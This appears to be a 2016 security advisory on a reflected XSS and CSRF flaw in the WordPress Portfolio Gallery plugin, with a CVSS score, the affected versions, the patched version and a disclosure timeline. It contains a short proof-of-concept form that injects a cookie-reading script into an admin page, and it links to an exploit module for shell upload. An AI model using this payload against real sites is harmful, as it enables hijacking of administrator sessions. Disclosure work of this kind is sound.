---
layout: single
title: Portfolio <= 2.1.10 Reflected XSS Disclosure
date: 2016-10-15
categories:
  - security
  - websec
  - disclosure
tags:
  - wordpress
  - portfolio-gallery
  - reflected xss
excerpt: Due to a lack of CSRF mitigation and entity encoding in the `portfolio_gallery_print_html_nav` function found on line 276 of `/includes/admin/portfolio-gallery-admin-functions.php`, it is possible to execute scripts in the context of an admin user.
---
## Homepage
[https://wordpress.org/plugins/portfolio-gallery/](https://wordpress.org/plugins/portfolio-gallery/)

## Overview
Due to a lack of CSRF mitigation and entity encoding in the `portfolio_gallery_print_html_nav` function found on line 276 of `/includes/admin/portfolio-gallery-admin-functions.php`, it is possible to execute scripts in the context of an admin user.

## CVSS Score
4.8

## CVSS Vector
[(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C)](https://nvd.nist.gov/cvss.cfm?calculator&version=2&vector=(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C))


## Versions Affected
2.1.10 and below

## Solution
Upgrade to version 2.1.11 or later

## Proof of Concept
```xml
<form method="post" action="http://[target]/wp-admin/admin.php?page=portfolios_huge_it_portfolio">
  <input name="page_number" value="&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;">
  <input type="submit" value="submit">
</form>
```

## WordPress Exploit Framework Module
[exploit/xss/reflected/portfolio\_reflected\_xss\_shell\_upload](https://github.com/rastating/wordpress-exploit-framework/blob/development/modules/exploit/xss/reflected/portfolio_reflected_xss_shell_upload.rb)

## WPVDB-ID
[8637](https://wpvulndb.com/vulnerabilities/8637)

## Disclosure Timeline
* **2016-08-30**: Vendor patched vulnerability
* **2016-10-15**: Published a POC with additional information due to no official disclosure being released to the public
